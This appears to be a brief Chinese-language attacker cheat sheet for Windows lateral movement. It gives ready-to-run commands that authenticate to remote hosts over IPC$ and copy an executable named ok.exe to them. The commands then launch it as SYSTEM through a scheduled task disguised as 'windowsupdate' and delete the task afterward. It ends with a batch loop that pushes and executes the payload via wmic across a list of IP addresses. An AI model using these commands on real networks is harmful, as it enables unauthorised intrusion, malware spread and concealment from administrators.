	>net use \\192.168.0.55\ipc$ "password" /user:"domain\administrator"
	>schtasks /query /fo LIST /v 查看计划任务
	上传文件
	>copy ok.exe \\192.168.0.55\c$\windows\temp
	Windows server 2012及以上
	远程创建定时任务 
	>schtasks /create /s "192.168.0.55" /u "admin" /p "qqq23" /RL HIGHEST /F /tn "windowsupdate" /tr "c:\windows\temp\ok.exe" /sc DAILY /mo 1 /ST 20:28 /RU SYSTEM
	查询远程创建的任务
	>schtasks /query /s "192.168.0.55" /U "admin" /P "qqq23" | findstr "windowsupdate" 
	立即执行远程任务
	>schtasks /run /tn windowsupdate /s "192.168.0.55" /U "admin" /P "qqq23" 
	删除定时任务 
	>schtasks /Delete /tn windowsupdate /F /s "192.168.0.55" /u "admin" /p "qqq23"
	删除IPC
	>net user name /del /y
	横向批量上线
	>for /f %i in (ip.txt) do net use \\%i\admin$ /user:"administrator" "password" & if %errorlevel% equ 0 ( copy ok.exe \\%i\admin$\debug\ /Y ) & wmic /NODE:"%i" /user:"administrator" /password:"password" PROCESS call create "c:\windows\debug\ok.exe" & @ping 127.0.0.1 -n 8 >nul & net use \\%i\admin$ /del
